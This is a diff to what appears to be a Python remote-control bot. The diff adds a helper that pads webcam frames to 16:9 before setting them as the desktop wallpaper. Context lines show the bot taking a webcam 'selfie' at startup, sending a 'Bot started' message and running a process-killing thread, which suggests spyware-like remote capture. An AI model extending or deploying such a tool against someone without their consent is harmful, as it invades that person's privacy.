@@ -13,7 +13,7 @@ from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, wai
                  setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                  destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
                  CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn, bitwise_not, INTER_LINEAR, BORDER_REFLECT, remap,
-                 destroyWindow, destroyAllWindows)
+                 destroyWindow, destroyAllWindows, copyMakeBorder, BORDER_CONSTANT)
 
 #MERGE AUDIO&VIDEO
 from moviepy.editor import AudioFileClip, VideoFileClip
@@ -336,6 +336,22 @@ def change_wallpaper(image_path):
         return True
     except Exception as e:
         return False
+
+def pad_to_16_9(image):
+    height, width = image.shape[:2]
+    current_ratio = width / height
+    target_ratio = 16 / 9
+    if abs(current_ratio - target_ratio) < 0.01:
+        return image
+    if current_ratio > target_ratio:
+        new_height = int(width / target_ratio)
+        pad = (new_height - height) // 2
+        padded = copyMakeBorder(image, pad, new_height - height - pad, 0, 0, BORDER_CONSTANT, value=(0, 0, 0))
+    else:
+        new_width = int(height * target_ratio)
+        pad = (new_width - width) // 2
+        padded = copyMakeBorder(image, 0, 0, pad, new_width - width - pad, BORDER_CONSTANT, value=(0, 0, 0))
+    return padded
 
 """
 oooooooooo.    .oooooo..o   .oooooo.   ooooooooo.   ooooo ooooooooo.   ooooooooooooo 
@@ -937,7 +953,6 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         self.restore_wallpaper()
 
     def setCameraAsWallpaper(self, seconds: float|int=5):
-        old_wallpaper_frame = imread(self.backup_wallpaper_path)
         seconds = int(seconds)
         loading_bar = self.new_loading_bar(label="Set Camera As Wallpaper", total=seconds, showperc=True)
         filename = join(BURN_DIRECTORY, "jxframe.png")
@@ -947,7 +962,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         while time()-start <= seconds and res:
             loading_bar.update(time()-start)
             res, frame = self.cap.read()
-            #frame = resize(frame, old_wallpaper_frame.shape[:2])
+            frame = pad_to_16_9(frame)
             imwrite(filename, frame)
             change_wallpaper(filename)
         loading_bar.set100()
@@ -1507,6 +1522,7 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         self.backup_wallpaper_path = join(BURN_DIRECTORY, get_current_wallpaper())
         self.cantopenthread = Thread(target=self.cantopenkiller)
         self.cantopenthread.start()
+        self.screen_width, self.screen_height = pg.size()
         if not sys.argv[1:]:
             if not self.selfie(f"Bot started: "+now()):
                 self.bsend(f"Bot started: {now()}")
